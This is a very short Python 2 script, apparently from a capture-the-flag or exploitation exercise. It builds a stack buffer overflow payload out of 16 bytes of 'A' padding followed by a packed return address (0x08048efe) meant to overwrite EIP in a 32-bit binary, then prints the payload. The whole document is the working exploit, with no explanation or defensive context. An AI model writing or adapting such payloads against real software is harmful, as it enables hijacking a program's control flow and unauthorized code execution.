#!/usr/bin/env python

import struct

padding = 'A'*16
eip = struct.pack("<I", 0x08048efe)

payload = ""
payload += padding
payload += eip

print payload
